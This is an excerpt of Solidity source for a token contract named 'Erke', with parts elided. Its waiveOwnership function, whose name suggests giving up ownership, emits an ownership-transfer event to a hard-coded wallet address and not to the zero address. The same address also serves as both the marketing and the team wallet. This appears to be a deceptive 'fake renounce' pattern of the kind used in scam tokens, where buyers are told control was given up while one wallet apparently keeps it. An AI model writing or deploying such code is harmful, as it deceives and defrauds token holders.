...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x14bCfECBCb7BF4770608879bEAF721Ecc3265Fb5));
...
contract Erke is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Erke";
    string private _symbol = "Erke";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x14bCfECBCb7BF4770608879bEAF721Ecc3265Fb5);
    address payable public teamWalletAddress = payable(0x14bCfECBCb7BF4770608879bEAF721Ecc3265Fb5);
